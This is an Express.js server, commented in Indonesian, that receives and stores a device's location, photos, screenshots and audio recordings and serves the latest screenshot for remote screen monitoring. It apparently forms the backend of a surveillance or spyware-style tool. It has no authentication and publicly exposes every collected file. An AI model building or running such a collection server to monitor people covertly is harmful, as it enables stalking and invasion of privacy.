const express = require("express");
const cors = require("cors");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const db = require("./db");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());
app.use("/uploads", express.static("uploads"));

// Multer setup untuk berbagai jenis file
const makeStorage = (folder) => multer.diskStorage({
  destination: "uploads/" + folder,
  filename: (_, file, cb) => {
    cb(null, Date.now() + "-" + file.originalname);
  },
});

const uploadPhoto = multer({ storage: makeStorage("photo") });
const uploadScreenshot = multer({ storage: makeStorage("screenshot") });
const uploadAudio = multer({ storage: makeStorage("audio") });

// Routes
app.get("/", (req, res) => {
  res.send("✅ Server Aktif");
});

app.post("/api/location", (req, res) => {
  const { latitude, longitude } = req.body;
  if (!latitude || !longitude) return res.status(400).json({ error: "Data tidak lengkap." });

  db.query("INSERT INTO locations (latitude, longitude) VALUES (?, ?)", [latitude, longitude], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

app.post("/api/photo", uploadPhoto.single("photo"), (req, res) => {
  db.query("INSERT INTO photos (filename, path) VALUES (?, ?)", [req.file.filename, req.file.path], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true, file: req.file.path });
  });
});

app.post("/api/screenshot", uploadScreenshot.single("screenshot"), (req, res) => {
  db.query("INSERT INTO screenshots (filename, path) VALUES (?, ?)", [req.file.filename, req.file.path], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true, file: req.file.path });
  });
});

app.post("/api/audio", uploadAudio.single("audio"), (req, res) => {
  db.query("INSERT INTO audios (filename, path) VALUES (?, ?)", [req.file.filename, req.file.path], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true, file: req.file.path });
  });
});

// Monitoring layar (ambil screenshot terbaru)
app.get("/api/latest-screenshot", (req, res) => {
  fs.readdir("uploads/screenshot", (err, files) => {
    if (err || !files.length) return res.status(404).send("Tidak ada screenshot");
    const latest = files.sort((a, b) => fs.statSync("uploads/screenshot/" + b).mtime - fs.statSync("uploads/screenshot/" + a).mtime)[0];
    res.sendFile(path.resolve("uploads/screenshot", latest));
  });
});

app.listen(PORT, () => {
  console.log(`Server berjalan di port ${PORT}`);
});